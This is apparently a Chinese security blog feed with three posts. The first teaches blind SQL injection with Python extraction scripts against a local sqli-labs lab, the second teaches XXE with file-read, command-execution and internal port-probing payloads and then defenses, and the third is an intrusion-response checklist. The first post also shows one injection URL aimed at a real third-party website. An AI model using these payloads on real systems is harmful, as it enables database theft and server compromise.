<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- encoding:utf-8 -*-</div><div class="line">import requests</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pos in range(10):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (high + low) &gt;&gt; 1</div><div class="line"></div><div class="line">    while mid &lt; high:</div><div class="line">        #print low, mid, high</div><div class="line">        payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div><div class="line">        url = payload.format(pos,mid)</div><div class="line">        req = requests.get(url)</div><div class="line">        length = len(req.text)</div><div class="line">        if length == 706:  ##返回的长度只有706和722</div><div class="line">            low = mid+1</div><div class="line">        else:</div><div class="line">            high = mid</div><div class="line">        mid = (high+low)&gt;&gt;1</div><div class="line">    key += chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure>
<ul>
<li>获取表长度<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;0 %23</div></pre></td></tr></table></figure>
</li>
</ul>
<p>发现当值为6的时候，页面就没有显示。那么说明表的长度是6</p>
<ul>
<li><p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">和上面类似，只需要把payload修改为下面即可：</div><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23</div></pre></td></tr></table></figure>
</li>
<li><p>获取列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>获取内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select username from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select password from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x05-基于时间盲注"><a href="#0x05-基于时间盲注" class="headerlink" title="0x05 基于时间盲注"></a>0x05 基于时间盲注</h3><p>If(expr1,expr2,expr3)    判断语句<br>if(database()=’security’,1,2) 判断数据库名是否为security，正确返回1，错误返回2。基于时间的注入和基于布尔差不多，引入了if语句进行判断。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117,sleep(5),NULL) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">| NULL |</div><div class="line">+------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),NULL) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">|    0 |</div><div class="line">+------+</div><div class="line">1 row in set (5.00 sec)</div></pre></td></tr></table></figure>
<p>以Sqli-labs Less8为例，无论我们怎么输入，输出结果都是You are in ，所以判断为基于时间的盲注。</p>
<ul>
<li><p>数据库长度判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if(length(database())&gt;9,0,sleep(5)) --+</div></pre></td></tr></table></figure>
</li>
<li><p>使用二分法获得数据库名</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- encoding: utf-8 -*-</div><div class="line">import requests</div><div class="line">import time</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pos in range(10):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (high + low) &gt;&gt; 1</div><div class="line"></div><div class="line">    while mid &lt; high:</div><div class="line">                startTime=time.time()</div><div class="line">                payload = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div><div class="line">                url = payload.format(pos,mid)</div><div class="line">                response=requests.get(url)    #发送请求</div><div class="line">                if time.time() - startTime &lt; 5:    #判断是否延时了5秒</div><div class="line">                    low = mid + 1</div><div class="line">                else:</div><div class="line">                    high = mid</div><div class="line">                mid = (high + low) &gt;&gt; 1</div><div class="line">    key += chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure>
<p>剩余步骤和基于布尔的差不多，只是加了一个if判断语句进行判断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">获取表名：</div><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23</div><div class="line">获取列名：</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div><div class="line">获取内容：</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select password from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div></pre></td></tr></table></figure></p>
<p>1,column_name from information_schema.columns where table_schema = database() and table_name = 0x6d63795f61646d696e</p>
<p><a href="http://www.innogreen.com.hk/VerticalGreening.php?id=-22" target="_blank" rel="external">http://www.innogreen.com.hk/VerticalGreening.php?id=-22</a> union select 1,group_concat(column_name) from information_schema.columns where  table_name = 0x6d63795f61646d696e #</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-SQL注入&quot;&gt;&lt;a href=&quot;#0x01-SQL注入&quot; class=&quot;headerlink&quot; title=&quot;0x01 SQL注入&quot;&gt;&lt;/a&gt;0x01 SQL注入&lt;/h3&gt;&lt;p&gt;1、连接符:mysql 空格，Oracle ||,sql server +&lt;br&gt;2、黑魔法${IFS}，Linux下可以使用其代替空格&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞攻防</title>
    <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E/2017/06/30/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2.html"/>
    <id>http://yoursite.com/漏洞/2017/06/30/XXE漏洞攻防.html</id>
    <published>2017-06-30T02:30:55.000Z</published>
    <updated>2017-07-01T13:31:29.046Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-XXE"><a href="#0x01-XXE" class="headerlink" title="0x01 XXE"></a>0x01 XXE</h3><p>　　XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击，漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p>
<h3 id="0x02-XML"><a href="#0x02-XML" class="headerlink" title="0x02 XML"></a>0x02 XML</h3><p>　　XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!--XML申明--&gt;</div><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;   </div><div class="line">&lt;!--文档类型定义--&gt;</div><div class="line">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</div><div class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</div><div class="line">  &lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</div><div class="line">  &lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</div><div class="line">  &lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</div><div class="line">  &lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</div><div class="line">]&gt;</div><div class="line">&lt;!--文档元素--&gt;</div><div class="line">&lt;note&gt;</div><div class="line">&lt;to&gt;Dave&lt;/to&gt;</div><div class="line">&lt;from&gt;Tom&lt;/from&gt;</div><div class="line">&lt;head&gt;Reminder&lt;/head&gt;</div><div class="line">&lt;body&gt;You are a good man&lt;/body&gt;</div><div class="line">&lt;/note&gt;</div></pre></td></tr></table></figure></p>
<p>　　DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<ul>
<li><p>内部声明DTD</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 [元素声明]</div></pre></td></tr></table></figure>
</li>
<li><p>引用外部DTD</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</div><div class="line">或者</div><div class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>　　DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值，可以内部声明或外部引用。实体按类型主要分为以下四种：</p>
<blockquote>
<p>内置实体 (Built-in entities)<br>字符实体 (Character entities)<br>通用实体 (General entities)<br>参数实体 (Parameter entities)</p>
</blockquote>
<ul>
<li><p>内部声明实体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>引用外部实体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</div><div class="line">或者</div><div class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>参数实体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</div><div class="line">或者</div><div class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x03-XML外部实体注入"><a href="#0x03-XML外部实体注入" class="headerlink" title="0x03 XML外部实体注入"></a>0x03 XML外部实体注入</h3><p>　　当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<ul>
<li><p>恶意引用外部实体方式1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">  &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>恶意引用外部实体方式2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">  &lt;!ENTITY % b SYSTEM &quot;http://zjw.dropsec.xyz/1.dtd&quot;&gt;</div><div class="line">  %b;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>DTD文件(1.dtd)内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div></pre></td></tr></table></figure></p>
<ul>
<li>恶意引用外部实体方式3<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">  &lt;!ENTITY a SYSTEM &quot;http://zjw.dropsec.xyz/1.dtd&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>DTD文件(1.dtd)内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div></pre></td></tr></table></figure></p>
<p>不同的程序支持不同的协议:<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-30/57454021.jpg" alt=""><br>另外PHP还支持一些扩展协议：<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-30/56162947.jpg" alt=""></p>
<blockquote>
<p>XXE危害：读取任意文件<br>由于采用的centos的系统，一些效果可能没有出来，但是思路是没有错的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$xml = &lt;&lt;&lt; EOF</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </div><div class="line">&lt;!DOCTYPE ANY [  </div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&gt;]&gt;    </div><div class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</div><div class="line">EOF;</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>XXE危害：执行系统命令</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$xml=&lt;&lt;&lt;EOF</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE ANY [</div><div class="line">        &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</div><div class="line">EOF;</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line">$a =3;</div><div class="line">echo $a;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-30/80284871.jpg" alt=""></p>
<blockquote>
<p>探测内网端口</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$xml=&lt;&lt;&lt;EOF</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE ANY [</div><div class="line">        &lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.121:80/web1/&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</div><div class="line">EOF;</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line">$a =3;</div><div class="line">echo $a;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<blockquote>
<p>XXE危害：攻击内网网站</p>
</blockquote>
<h3 id="0x04-XXE防御"><a href="#0x04-XXE防御" class="headerlink" title="0x04 XXE防御"></a>0x04 XXE防御</h3><ul>
<li><p>使用开发语言提供的禁用外部实体的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PHP：</div><div class="line">libxml_disable_entity_loader(true);</div><div class="line">JAVA:</div><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(false);</div><div class="line">Python：</div><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</div></pre></td></tr></table></figure>
</li>
<li><p>过滤用户提交的XML数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</div></pre></td></tr></table></figure>
</li>
</ul>
<p>参考链接：<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/69</a><br>        <a href="http://thief.one/2017/06/20/1/" target="_blank" rel="external">http://thief.one/2017/06/20/1/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-XXE&quot;&gt;&lt;a href=&quot;#0x01-XXE&quot; class=&quot;headerlink&quot; title=&quot;0x01 XXE&quot;&gt;&lt;/a&gt;0x01 XXE&lt;/h3&gt;&lt;p&gt;　　XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击，漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。&lt;/p&gt;
&lt;h3 id=&quot;0x02-XML&quot;&gt;&lt;a href=&quot;#0x02-XML&quot; class=&quot;headerlink&quot; title=&quot;0x02 XML&quot;&gt;&lt;/a&gt;0x02 XML&lt;/h3&gt;&lt;p&gt;　　XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="XXE" scheme="http://yoursite.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>[转]黑客入侵应急分析手工排查</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/06/16/%E8%BD%AC-%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E5%BA%94%E6%80%A5%E5%88%86%E6%9E%90%E6%89%8B%E5%B7%A5%E6%8E%92%E6%9F%A5.html"/>
    <id>http://yoursite.com/渗透/2017/06/16/转-黑客入侵应急分析手工排查.html</id>
    <published>2017-06-16T12:55:01.000Z</published>
    <updated>2017-06-18T02:19:37.342Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-事件分类"><a href="#0x00-事件分类" class="headerlink" title="0x00 事件分类"></a>0x00 事件分类</h3><p>常见的安全事件：<br>　　Web入侵：挂马、篡改、Webshell<br>　　系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞<br>　　病毒木马：远控、后门、勒索软件<br>　　信息泄漏：拖裤、数据库登录（弱口令）<br>　　网络流量：频繁发包、批量请求、DDOS攻击<br><a id="more"></a></p>
<h3 id="0x01-排查思路"><a href="#0x01-排查思路" class="headerlink" title="0x01 排查思路"></a>0x01 排查思路</h3><p><strong>一个常规的入侵事件后的系统排查思路：</strong><br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/44445401.jpg" alt=""></p>
<ul>
<li>文件分析<br>​a) 文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件<br>​b) Webshell 排查与分析<br>​c) 核心应用关联目录文件分析</li>
<li>进程分析<br>a) 当前活动进程 &amp; 远程连接<br>​b) 启动进程&amp;计划任务<br>​c) 进程工具分析<br>　　Windows:Pchunter<br>　　Linux: Chkrootkit&amp;Rkhunter</li>
<li>系统信息<br>a) 环境变量<br>​b) 帐号信息<br>​c) History<br>​d) 系统配置文件</li>
<li>日志分析<br>a) 操作系统日志<br>　　Windows: 事件查看器（eventvwr）<br>　　Linux: /var/log/<br>​b) 应用日志分析<br>　　Access.log<br>　　Error.log</li>
</ul>
<h3 id="0x02-分析排查"><a href="#0x02-分析排查" class="headerlink" title="0x02 分析排查"></a>0x02 分析排查</h3><h4 id="0x01-Linux系列分析排查"><a href="#0x01-Linux系列分析排查" class="headerlink" title="0x01 Linux系列分析排查"></a>0x01 Linux系列分析排查</h4><p>1、文件分析</p>
<ul>
<li>敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）<br>例如:<br>　　​查看tmp目录下的文件： ls –alt /tmp/<br>　　​查看开机启动项内容：ls -alt /etc/init.d/<br>　　​查看指定目录下文件时间的排序：ls  -alt  | head -n 10<br>　　​针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有线性关联，说明可能被篡改或者其他。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/4337956.jpg" alt=""></li>
<li><p>新增文件分析<br>​例如要查找24小时内被修改的JSP文件： find ./ -mtime 0 -name “*.jsp”<br>（最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）<br>​查找72小时内新增的文件find / -ctime -2<br>​PS：-ctime 内容未改变权限改变时候也可以查出<br>根据确定时间去反推变更的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">​ls -al /tmp | grep &quot;Feb 27&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>特殊权限的文件<br>　　查找777的权限的文件   find  /  *.jsp  -perm 4777  </p>
</li>
<li>隐藏的文件（以 “.”开头的具有隐藏属性的文件）</li>
<li>在文件分析过程中，手工排查频率较高的命令是 find grep ls 核心目的是为了关联推理出可疑文件。</li>
</ul>
<p>2、进程命令</p>
<ul>
<li>使用netstat 网络连接命令，分析可疑端口、可疑IP、可疑PID及程序进程<br>netstat –antlp | more<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/75256723.jpg" alt=""></li>
<li>使用ps命令，分析进程<br>ps aux | grep pid | grep –v grep<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/97053272.jpg" alt=""><br>将netstat与ps 结合，可参考vinc牛的案例：<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/11388717.jpg" alt=""><br>（可以使用lsof -i:1677 查看指定端口对应的程序）</li>
<li>使用ls 以及 stat 查看系统命令是否被替换<br>​两种思路：第一种查看命令目录最近的时间排序，第二种根据确定时间去匹配。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">​ls -alt /usr/bin   | head -10</div><div class="line">​ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep &quot;Jan 15&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/40654881.jpg" alt=""><br><strong>PS：如果日期数字&lt;10，中间需要两个空格。比如1月1日，grep “Jan  1”</strong></p>
<ul>
<li>隐藏进程查看<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ps -ef | awk &apos;&#123;print&#125;&apos; | sort -n | uniq &gt;1</div><div class="line">ls /proc | sort -n |uniq &gt;2</div><div class="line">diff 1 2</div></pre></td></tr></table></figure>
</li>
</ul>
<p>3、系统信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">history (cat /root/.bash_history)</div><div class="line">/etc/passwd</div><div class="line">crontab  /etc/cron*</div><div class="line">rc.local  /etc/init.d chkconfig</div><div class="line">last</div><div class="line">$PATH</div><div class="line">strings</div></pre></td></tr></table></figure></p>
<ul>
<li>查看分析history (cat /root/.bash_history)，曾经的命令操作痕迹，以便进一步排查溯源。运气好有可能通过记录关联到如下信息：<br>a) wget 远程某主机（域名&amp;IP）的远控文件；<br>b) 尝试连接内网某主机（ssh scp），便于分析攻击者意图;<br>c) 打包某敏感数据或代码，tar zip 类命令<br>d) 对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息</li>
<li>查看分析用户相关分析<br>​a) useradd userdel 的命令时间变化（stat），以及是否包含可疑信息<br>b) cat /etc/passwd 分析可疑帐号，可登录帐号<br>　　查看UID为0的帐号：awk -F: ‘{if($3==0)print $1}’ /etc/passwd<br>　　查看能够登录的帐号：cat /etc/passwd  | grep -E “/bin/bash$”<br><strong>PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）</strong><br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/30173410.jpg" alt=""></li>
<li>查看分析任务计划<br>a) 通过crontabl –l 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息；<br>b) 查看etc目录任务计划相关文件，ls /etc/cron*</li>
<li>查看linux 开机启动程序<br>a) 查看rc.local文件（/etc/init.d/rc.local     /etc/rc.local）<br>b) ls –alt /etc/init.d/<br>c) chkconfig</li>
<li>查看系统用户登录信息<br>a) 使用lastlog命令，系统中所有用户最近一次登录信息。<br>b) 使用lastb命令，用于显示用户错误的登录列表<br>c) 使用last命令，用于显示用户最近登录信息（数据源为/var/log/wtmp，var/log/btmp）<br>　　utmp文件中保存的是当前正在本系统中的用户的信息。<br>　　wtmp文件中保存的是登录过本系统的用户的信息。<br>　　/var/log/wtmp 文件结构和/var/run/utmp 文件结构一样，都是引用/usr/include/bits/utmp.h 中的struct utmp<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/87352127.jpg" alt=""></li>
<li>系统路径分析<br>a) echo $PATH 分析有无敏感可疑信息</li>
